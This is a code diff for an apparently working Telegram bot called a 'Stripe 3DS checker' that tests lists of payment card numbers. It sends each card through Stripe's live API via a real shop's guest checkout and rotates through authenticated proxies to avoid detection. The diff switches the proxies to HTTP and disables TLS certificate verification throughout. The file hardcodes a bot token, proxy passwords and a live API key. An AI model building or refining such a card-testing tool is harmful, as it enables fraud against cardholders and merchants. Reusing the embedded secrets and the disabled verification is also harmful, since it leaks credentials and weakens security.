@@ -20,7 +20,7 @@ logger = logging.getLogger(__name__)
 BOT_TOKEN = "8166484030:AAEcpDe4EIoSRMCFKXQq33scCSiRaEfzAWU"
 ADMIN_IDS = [5895491379, 844663875]
 
-# قائمة البروكسيات SOCKS5
+# قائمة البروكسيات HTTP
 PROXIES_LIST = [
 "82.22.210.250:8092:bxnvwevk:utgavp02z833",
 "82.22.210.38:7880:bxnvwevk:utgavp02z833",
@@ -200,10 +200,11 @@ def parse_proxy(proxy_string):
         
         ip, port, username, password = parts
         
-        # صيغة SOCKS5
+        # صيغة HTTP مع Authentication
+        proxy_url = f'http://{username}:{password}@{ip}:{port}'
         proxy_dict = {
-            'http': f'socks5://{username}:{password}@{ip}:{port}',
-            'https': f'socks5://{username}:{password}@{ip}:{port}'
+            'http': proxy_url,
+            'https': proxy_url
         }
         
         return {
@@ -238,7 +239,8 @@ def test_proxy(proxy_data, timeout=10):
             test_url,
             proxies=proxy_data['proxies'],
             timeout=timeout,
-            headers={'User-Agent': 'Mozilla/5.0'}
+            headers={'User-Agent': 'Mozilla/5.0'},
+            verify=False  # تجاهل SSL verification للاختبار
         )
         
         if response.status_code in [200, 401, 403]:
@@ -302,7 +304,8 @@ def get_quote_id_smart(product_id=16124, qty=1, cookies=None, proxy_data=None):
             cookies=cookies,
             headers=headers,
             proxies=proxy_data['proxies'],
-            timeout=15
+            timeout=15,
+            verify=False
         )
         
         if r.status_code != 200:
@@ -323,7 +326,8 @@ def get_quote_id_smart(product_id=16124, qty=1, cookies=None, proxy_data=None):
                 data=data_add,
                 proxies=proxy_data['proxies'],
                 allow_redirects=True,
-                timeout=15
+                timeout=15,
+                verify=False
             )
             
             if r_add.status_code not in [200, 302]:
@@ -336,7 +340,8 @@ def get_quote_id_smart(product_id=16124, qty=1, cookies=None, proxy_data=None):
                 cookies=cookies,
                 headers=headers,
                 proxies=proxy_data['proxies'],
-                timeout=15
+                timeout=15,
+                verify=False
             )
             data = r.json()
             cart = data.get('cart', {})
@@ -359,6 +364,10 @@ stats = {
     'cards_checked': 0, 'authenticated_cards': [], 'challenge_cards': [], 'attempted_cards': [],
     'proxy_success': 0, 'proxy_failed': 0
 }
+
+# تعطيل تحذيرات SSL
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class StripeChecker:
     def __init__(self):
@@ -391,7 +400,7 @@ class StripeChecker:
             
             data = f'billing_details[address][state]=London&billing_details[address][postal_code]=SW1A+1AA&billing_details[address][country]=GB&billing_details[address][city]=London&billing_details[address][line1]=111+North+Street&billing_details[email]={random_email}&billing_details[name]=Card+Test&billing_details[phone]=3609998856&type=card&card[number]={clean_card}&card[cvc]={cvv}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&allow_redisplay=unspecified&pasted_fields=number&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
             
-            r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxy_data['proxies'], timeout=25)
+            r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxy_data['proxies'], timeout=25, verify=False)
             
             logger.info(f"✅ PM Status: {r.status_code}")
             
@@ -417,7 +426,7 @@ class StripeChecker:
             
             try:
                 estimate_payload = {'address': {'country_id': 'GB', 'postcode': 'SW1A 1AA', 'region': 'London', 'region_id': 0}}
-                r_estimate = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/estimate-shipping-methods', headers=headers, json=estimate_payload, proxies=proxy_data['proxies'], timeout=25)
+                r_estimate = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/estimate-shipping-methods', headers=headers, json=estimate_payload, proxies=proxy_data['proxies'], timeout=25, verify=False)
                 
                 carrier_code = 'matrixrate'
                 method_code = 'matrixrate_1165'
@@ -447,7 +456,7 @@ class StripeChecker:
             }
             
             try:
-                r_shipping = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/shipping-information', headers=headers, json=shipping_payload, proxies=proxy_data['proxies'], timeout=25)
+                r_shipping = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/shipping-information', headers=headers, json=shipping_payload, proxies=proxy_data['proxies'], timeout=25, verify=False)
                 logger.info(f"✅ Shipping Status: {r_shipping.status_code}")
                 
                 if r_shipping.status_code == 404 and retry_count < max_retries:
@@ -472,7 +481,7 @@ class StripeChecker:
                 'paymentMethod': {'method': 'stripe_payments', 'additional_data': {'payment_method': pm_id}}
             }
             
-            r = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information', headers=headers, json=payload, proxies=proxy_data['proxies'], timeout=25)
+            r = self.session.post(f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information', headers=headers, json=payload, proxies=proxy_data['proxies'], timeout=25, verify=False)
             
             logger.info(f"✅ PI Status: {r.status_code}")
             logger.info(f"📄 PI Response: {r.text[:300]}")
@@ -528,7 +537,7 @@ class StripeChecker:
             
             params = {'is_stripe_sdk': 'false', 'client_secret': client_secret, 'key': 'pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X', '_stripe_version': '2020-03-02'}
             
-            r = self.session.get(f'https://api.stripe.com/v1/payment_intents/{pi_id}', params=params, headers=headers, proxies=proxy_data['proxies'], timeout=25)
+            r = self.session.get(f'https://api.stripe.com/v1/payment_intents/{pi_id}', params=params, headers=headers, proxies=proxy_data['proxies'], timeout=25, verify=False)
             
             logger.info(f"✅ Fetch PI Status: {r.status_code}")
             
@@ -552,7 +561,7 @@ class StripeChecker:
                 elif pi_status == 'requires_confirmation':
                     logger.info("🔄 Confirming PI...")
                     data = f'payment_method={pm_id}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
-                    r = self.session.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm', headers=headers, data=data, proxies=proxy_data['proxies'], timeout=25)
+                    r = self.session.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm', headers=headers, data=data, proxies=proxy_data['proxies'], timeout=25, verify=False)
                     if r.status_code == 200:
                         pi = r.json()
                         if pi.get('status') == 'succeeded':
@@ -598,7 +607,7 @@ class StripeChecker:
             
             logger.info("🔐 Calling 3DS authenticate...")
             
-            r = self.session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers_3ds, data=data, proxies=proxy_data['proxies'], timeout=25)
+            r = self.session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers_3ds, data=data, proxies=proxy_data['proxies'], timeout=25, verify=False)
             
             logger.info(f"✅ 3DS Auth Status: {r.status_code}")
             logger.info(f"📄 3DS Response: {r.text[:500]}")
@@ -817,7 +826,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     proxy_status = f"🌐 **Proxies:** {len(PROXIES_LIST)} total\n✅ Working: {len(WORKING_PROXIES)}\n❌ Failed: {len(FAILED_PROXIES)}"
     
-    await update.message.reply_text(f"📊 **STRIPE 3DS CHECKER WITH PROXY**\n\n{proxy_status}\n\nSend .txt file with cards\nFormat: `number|month|year|cvv`\n\n**Responses:**\n✅ Y - Authenticated\n⚠️ C - Challenge\n🔵 A - Attempted\n❌ N - Not Auth\n🔴 U - Unavailable\n❌ R - Rejected\n\n**Features:**\n🌐 Auto proxy rotation\n🔄 Auto retry on failure\n✅ Proxy health check", parse_mode='Markdown')
+    await update.message.reply_text(f"📊 **STRIPE 3DS CHECKER WITH PROXY**\n\n{proxy_status}\n\nSend .txt file with cards\nFormat: `number|month|year|cvv`\n\n**Responses:**\n✅ Y - Authenticated\n⚠️ C - Challenge\n🔵 A - Attempted\n❌ N - Not Auth\n🔴 U - Unavailable\n❌ R - Rejected\n\n**Features:**\n🌐 Auto proxy rotation\n🔄 Auto retry on failure\n✅Proxy health check", parse_mode='Markdown')
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
@@ -846,7 +855,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     initial_cart = get_quote_id_smart()
     if initial_cart:
-                await update.message.reply_text(f"✅ Cart ready!\n🛒 `{initial_cart}`", parse_mode='Markdown')
+        await update.message.reply_text(f"✅ Cart ready!\n🛒 `{initial_cart}`", parse_mode='Markdown')
     else:
         await update.message.reply_text("⚠️ Cart warning - will retry during check")
     
